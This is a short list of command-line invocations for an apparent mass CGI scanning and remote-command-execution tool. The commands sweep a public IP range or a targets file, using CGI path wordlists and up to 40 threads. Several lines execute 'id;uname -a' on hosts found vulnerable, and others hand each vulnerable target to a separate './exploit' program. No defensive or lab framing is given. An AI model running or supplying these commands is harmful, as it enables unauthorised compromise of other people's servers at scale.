python main.py --range '194.206.187.X,194.206.187.XXX' --check --thread 40 --ssl

python main.py --range '194.206.187.X,194.206.187.XXX' --check --thread 10 --ssl --cgi-file 'wordlist/cgi.txt'

python main.py --range '194.206.187.X,194.206.187.XXX' --cmd 'id;uname -a' --thread 10 --ssl --cgi-file 'wordlist/cgi.txt'

python main.py --file targets.txt --cmd 'id;uname -a' --thread 10 --ssl --cgi-file 'wordlist/cgi.txt'

python main.py --file targets.txt --cmd 'id;uname -a' --thread 10 --ssl --cgi-file 'wordlist/cgi.txt' --all

python main.py --range '194.206.187.X,194.206.187.XXX' --check --thread 40 --ssl --cgi-file 'wordlist/cgi2.txt' --exec-vuln 'curl -v -k -i "_TARGET_"'

python main.py --range '194.206.187.X,194.206.187.XXX' --check --thread 40 --ssl --cgi-file 'wordlist/cgi2.txt' --exec-vuln './exploit -t "_TARGET_"'